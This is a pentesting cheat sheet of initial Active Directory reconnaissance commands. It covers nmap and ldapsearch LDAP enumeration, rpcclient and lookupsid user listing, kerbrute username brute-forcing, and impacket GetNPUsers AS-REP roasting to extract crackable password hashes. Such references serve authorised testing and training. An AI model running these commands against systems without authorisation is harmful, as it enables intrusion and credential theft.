# Initial Scans

Scan LDAP with nmap

```
nmap -p 389 -sC -sV $ip
```

LDAP Enumeration

```
ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip"
```

Get User account & description field

{% code overflow="wrap" %}
```bash
ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip" | grep 'sAMAccountName|description'
```
{% endcode %}

Get User accounts

```
rpcclient -U% $ip
enumdomusers
enumdomains
enumprivs
```

Quick Bruteforce scan for valid usernames

```bash
kerbrute userenum -d $domain --dc $ip /usr/share/seclists/Usernames/Names/names.txt
```

Extensive Bruteforce scan for valid usernames

{% code overflow="wrap" %}
```bash
kerbrute userenum -d $domain --dc $ip /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
{% endcode %}

Userless RDP session / See who is logged on / lock screen info

```bash
rdesktop -f -u "" $ip
```

Get Password Policy

```bash
crackmapexec smb $ip --pass-pol -u '' -p ''
```

Get Hashes if anon access allowed

{% code overflow="wrap" %}
```bash
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/ -format john -outputfile hash
```
{% endcode %}

List and get TGTs for those users without preauth set

{% code overflow="wrap" %}
```bash
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/ -usersfile users.txt -format john -outputfile hash
```
{% endcode %}

Get users from IPC$ share

{% code overflow="wrap" %}
```bash
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@$ip | tee users.txt
```
{% endcode %}
